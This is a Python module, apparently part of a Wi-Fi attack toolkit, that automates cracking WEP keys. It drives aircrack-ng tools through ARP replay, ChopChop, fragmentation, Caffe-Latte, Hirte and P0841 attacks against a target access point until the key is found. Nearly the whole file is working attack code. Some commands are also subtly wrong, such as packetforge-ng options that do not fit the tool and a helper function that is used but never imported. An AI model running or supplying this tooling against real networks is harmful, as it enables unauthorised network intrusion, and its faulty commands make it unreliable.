"""
Módulo de ataque WEP.

Este módulo implementa ataques contra redes WEP, incluindo:
- Injeção de pacotes
- Ataque ARP Request Replay
- Ataque ChopChop
- Ataque Fragmentation
- Ataque Caffe-Latte
- Ataque Hirte
- Ataque P0841
"""
import os
import re
import time
import logging
import subprocess
import tempfile
from typing import Optional, Dict, List, Tuple, Any, Callable
from dataclasses import dataclass, field
from enum import Enum, auto

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

from ...core.models.network import WiFiNetwork
from ...core.utils import (
    is_root, check_dependencies, get_network_interfaces,
    set_monitor_mode, restore_network_interface, command_exists
)

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
console = Console()

class WEPAttackType(Enum):
    """Tipos de ataque WEP."""
    ARP_REPLAY = auto()
    CHOPCHOP = auto()
    FRAGMENTATION = auto()
    CAFFE_LATTE = auto()
    HIRTE = auto()
    P0841 = auto()
    FRAGMENT = auto()
    CHOPCHOP_FRAGMENT = auto()

class WEPEventType(Enum):
    """Tipos de eventos do ataque WEP."""
    START = auto()
    IVS_COLLECTED = auto()
    KEY_FOUND = auto()
    ATTACK_STARTED = auto()
    ATTACK_UPDATE = auto()
    ERROR = auto()
    COMPLETE = auto()

@dataclass
class WEPEvent:
    """Evento de progresso do ataque WEP."""
    type: WEPEventType
    message: str = ""
    data: Dict[str, Any] = field(default_factory=dict)

class WEPAttack:
    """Classe para realizar ataques WEP."""
    
    def __init__(self, interface: str = None, timeout: int = 300):
        """
        Inicializa o ataque WEP.
        
        Args:
            interface: Interface de rede para usar no ataque
            timeout: Tempo máximo de execução em segundos
        """
        self.interface = interface
        self.timeout = timeout
        self.is_running = False
        self.stop_requested = False
        self.key_found = False
        self.key = ""
        self.ivs_collected = 0
        self.required_ivs = 10000  # Valor padrão, pode ser ajustado
        
        # Verifica dependências
        self._check_dependencies()
        
        # Verifica privilégios
        if not is_root():
            raise PermissionError("Este ataque requer privilégios de root")
    
    def _check_dependencies(self) -> None:
        """Verifica se todas as dependências necessárias estão instaladas."""
        required = ['airodump-ng', 'aireplay-ng', 'aircrack-ng', 'packetforge-ng']
        missing = [cmd for cmd in required if not command_exists(cmd)]
        
        if missing:
            raise RuntimeError(
                f"As seguintes dependências estão faltando: {', '.join(missing)}\n"
                "Instale-as com: sudo apt install aircrack-ng"
            )
    
    def start_attack(self, bssid: str, channel: int, essid: str = None,
                    attack_type: WEPAttackType = WEPAttackType.ARP_REPLAY,
                    client_mac: str = None,
                    callback: Callable[[WEPEvent], None] = None) -> Tuple[bool, str]:
        """
        Inicia um ataque WEP.
        
        Args:
            bssid: Endereço MAC do ponto de acesso
            channel: Canal da rede
            essid: Nome da rede (opcional)
            attack_type: Tipo de ataque WEP a ser executado
            client_mac: Endereço MAC do cliente a ser atacado (opcional)
            callback: Função de callback para eventos
            
        Returns:
            Tupla (sucesso, chave_wep)
        """
        self.is_running = True
        self.stop_requested = False
        self.key_found = False
        self.key = ""
        self.ivs_collected = 0
        
        # Configura o monitoramento de eventos
        def event_handler(event_type: WEPEventType, message: str = "", **kwargs):
            if callback:
                event = WEPEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        # Cria um diretório temporário para os arquivos
        with tempfile.TemporaryDirectory() as temp_dir:
            try:
                output_file = os.path.join(temp_dir, 'wep_capture')
                cap_file = f"{output_file}-01.cap"
                
                # Inicia o airodump-ng para capturar IVs
                cmd_airodump = [
                    'airodump-ng',
                    '--bssid', bssid,
                    '-c', str(channel),
                    '-w', output_file,
                    '--output-format', 'cap',
                    '--write-interval', '1',
                    self.interface
                ]
                
                if essid:
                    cmd_airodump.extend(['--essid', essid])
                
                event_handler(WEPEventType.START, "Iniciando captura de IVs WEP...")
                
                # Executa o airodump-ng em segundo plano
                airodump_proc = subprocess.Popen(
                    cmd_airodump,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True
                )
                
                # Aguarda o airodump-ng iniciar
                time.sleep(5)
                
                # Inicia o ataque específico
                attack_proc = None
                attack_cmd = []
                
                if attack_type == WEPAttackType.ARP_REPLAY:
                    attack_cmd = self._prepare_arp_replay(bssid, client_mac)
                elif attack_type == WEPAttackType.CHOPCHOP:
                    attack_cmd = self._prepare_chopchop(bssid, client_mac)
                elif attack_type == WEPAttackType.FRAGMENTATION:
                    attack_cmd = self._prepare_fragmentation(bssid, client_mac)
                elif attack_type == WEPAttackType.CAFFE_LATTE:
                    attack_cmd = self._prepare_caffe_latte(bssid)
                elif attack_type == WEPAttackType.HIRTE:
                    attack_cmd = self._prepare_hirte(bssid)
                elif attack_type == WEPAttackType.P0841:
                    attack_cmd = self._prepare_p0841(bssid)
                elif attack_type == WEPAttackType.FRAGMENT:
                    attack_cmd = self._prepare_fragment(bssid, client_mac)
                elif attack_type == WEPAttackType.CHOPCHOP_FRAGMENT:
                    attack_cmd = self._prepare_chopchop_fragment(bssid, client_mac)
                
                if attack_cmd:
                    event_handler(
                        WEPEventType.ATTACK_STARTED,
                        f"Iniciando ataque {attack_type.name.replace('_', ' ').title()}...",
                        attack_type=attack_type
                    )
                    
                    attack_proc = subprocess.Popen(
                        attack_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True
                    )
                
                # Monitora o progresso
                start_time = time.time()
                last_ivs = 0
                
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(bar_width=40),
                    "[progress.percentage]{task.percentage:>3.0f}%",
                    TimeElapsedColumn(),
                    console=console,
                    transient=True,
                ) as progress:
                    task = progress.add_task("Coletando IVs WEP...", total=self.required_ivs)
                    
                    while True:
                        # Verifica timeout
                        if time.time() - start_time > self.timeout:
                            event_handler(
                                WEPEventType.ERROR,
                                "Tempo limite excedido no ataque WEP"
                            )
                            airodump_proc.terminate()
                            if attack_proc:
                                attack_proc.terminate()
                            return False, ""
                        
                        # Verifica se foi solicitado para parar
                        if self.stop_requested:
                            event_handler(
                                WEPEventType.ERROR,
                                "Ataque interrompido pelo usuário"
                            )
                            airodump_proc.terminate()
                            if attack_proc:
                                attack_proc.terminate()
                            return False, ""
                        
                        # Verifica se o arquivo de captura existe
                        if os.path.exists(cap_file):
                            # Verifica se a chave foi encontrada
                            key = self._check_cracked(cap_file, bssid)
                            if key:
                                self.key = key
                                self.key_found = True
                                event_handler(
                                    WEPEventType.KEY_FOUND,
                                    f"Chave WEP encontrada: {key}",
                                    key=key
                                )
                                airodump_proc.terminate()
                                if attack_proc:
                                    attack_proc.terminate()
                                return True, key
                            
                            # Atualiza a contagem de IVs
                            ivs = self._count_ivs(cap_file, bssid)
                            if ivs > last_ivs:
                                self.ivs_collected = ivs
                                last_ivs = ivs
                                progress.update(task, completed=min(ivs, self.required_ivs))
                                
                                event_handler(
                                    WEPEventType.IVS_COLLECTED,
                                    f"IVs coletados: {ivs}",
                                    ivs=ivs,
                                    progress=min(100, (ivs / self.required_ivs) * 100)
                                )
                        
                        # Aguarda um pouco antes da próxima verificação
                        time.sleep(2)
                
                return False, ""
                
            except Exception as e:
                event_handler(
                    WEPEventType.ERROR,
                    f"Erro durante o ataque WEP: {str(e)}"
                )
                return False, ""
            
            finally:
                self.is_running = False
                # Encerra processos em execução
                try:
                    airodump_proc.terminate()
                except:
                    pass
                try:
                    if attack_proc:
                        attack_proc.terminate()
                except:
                    pass
    
    def _prepare_arp_replay(self, bssid: str, client_mac: str = None) -> List[str]:
        """Prepara o comando para o ataque ARP Request Replay."""
        cmd = [
            'aireplay-ng',
            '--arpreplay',
            '-b', bssid,
            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
            '--ignore-negative-one',
            self.interface
        ]
        
        if client_mac:
            cmd.extend(['-d', 'ff:ff:ff:ff:ff:ff', '-m', '68', '-n', '86', '-t', '1'])
        
        return cmd
    
    def _prepare_chopchop(self, bssid: str, client_mac: str = None) -> List[str]:
        """Prepara o comando para o ataque ChopChop."""
        cmd = [
            'aireplay-ng',
            '--chopchop',
            '-b', bssid,
            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
            '--ignore-negative-one',
            self.interface
        ]
        
        if client_mac:
            cmd.extend(['-t', '1', '--bof', '64'])
        
        return cmd
    
    def _prepare_fragmentation(self, bssid: str, client_mac: str = None) -> List[str]:
        """Prepara o comando para o ataque de Fragmentação."""
        cmd = [
            'aireplay-ng',
            '--fragment',
            '-b', bssid,
            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
            '--ignore-negative-one',
            self.interface
        ]
        
        if client_mac:
            cmd.extend(['-t', '1', '--bof', '64'])
        
        return cmd
    
    def _prepare_caffe_latte(self, bssid: str) -> List[str]:
        """Prepara o comando para o ataque Caffe-Latte."""
        return [
            'aireplay-ng',
            '--caffe-latte',
            '-b', bssid,
            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
            '--ignore-negative-one',
            self.interface
        ]
    
    def _prepare_hirte(self, bssid: str) -> List[str]:
        """Prepara o comando para o ataque Hirte."""
        return [
            'aireplay-ng',
            '--hirte',
            '-b', bssid,
            '--ignore-negative-one',
            self.interface
        ]
    
    def _prepare_p0841(self, bssid: str) -> List[str]:
        """Prepara o comando para o ataque P0841."""
        return [
            'aireplay-ng',
            '--arpreplay',
            '-b', bssid,
            '-c', 'ff:ff:ff:ff:ff:ff',
            '-x', '1024',
            '--ignore-negative-one',
            self.interface
        ]
    
    def _prepare_fragment(self, bssid: str, client_mac: str = None) -> List[str]:
        """Prepara o comando para o ataque de Fragmentação (alternativo)."""
        cmd = [
            'aireplay-ng',
            '--fragment',
            '-b', bssid,
            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
            '--ignore-negative-one',
            '--frag', '100',
            self.interface
        ]
        
        if client_mac:
            cmd.extend(['-d', client_mac])
        
        return cmd
    
    def _prepare_chopchop_fragment(self, bssid: str, client_mac: str = None) -> List[str]:
        """Prepara o comando para o ataque ChopChop + Fragmentação."""
        # Primeiro, executa o ChopChop para obter um pacote
        temp_dir = tempfile.mkdtemp()
        chop_file = os.path.join(temp_dir, 'chopchop')
        
        cmd_chop = [
            'packetforge-ng',
            '--chopchop',
            '-a', bssid,
            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
            '-k', '255.255.255.255',
            '-l', '255.255.255.255',
            '-y', 'fragment-*.xor',
            '-w', chop_file,
            self.interface
        ]
        
        # Depois, injeta o pacote com o ARP Replay
        cmd_replay = [
            'packetforge-ng',
            '--arp',
            '-a', bssid,
            '-h', get_interface_mac(self.interface) or '00:11:22:33:44:55',
            '-k', '255.255.255.255',
            '-l', '255.255.255.255',
            '-y', 'fragment-*.xor',
            '-w', f"{chop_file}-arp",
            '-r'
        ]
        
        # Combina os comandos
        return [
            'bash', '-c', 
            f"{' '.join(cmd_chop)} && {' '.join(cmd_replay)} && "
            f"aireplay-ng --interactive -r {chop_file}-arp -h {get_interface_mac(self.interface) or '00:11:22:33:44:55'} {self.interface}"
        ]
    
    def _count_ivs(self, cap_file: str, bssid: str) -> int:
        """Conta o número de IVs únicos em um arquivo de captura."""
        try:
            cmd = ['aircrack-ng', cap_file, '-b', bssid, '-n', '128']
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Procura por linhas como: "1 target successfully tested, 1 IVs"
            match = re.search(r'(\d+)\s+IVs', result.stdout)
            if match:
                return int(match.group(1))
            
            return 0
            
        except Exception as e:
            logger.error(f"Erro ao contar IVs: {e}")
            return 0
    
    def _check_cracked(self, cap_file: str, bssid: str) -> Optional[str]:
        """Verifica se a chave WEP foi quebrada."""
        try:
            cmd = ['aircrack-ng', cap_file, '-b', bssid, '-n', '128', '-l', '-']
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Procura por uma chave no formato: "KEY FOUND! [ 12:34:56:78:90 ]"
            match = re.search(r'KEY FOUND! \[ ([^\]]+) \]', result.stdout)
            if match:
                return match.group(1).strip()
            
            return None
            
        except Exception as e:
            logger.error(f"Erro ao verificar chave WEP: {e}")
            return None
    
    def stop(self):
        """Solicita a interrupção do ataque."""
        self.stop_requested = True
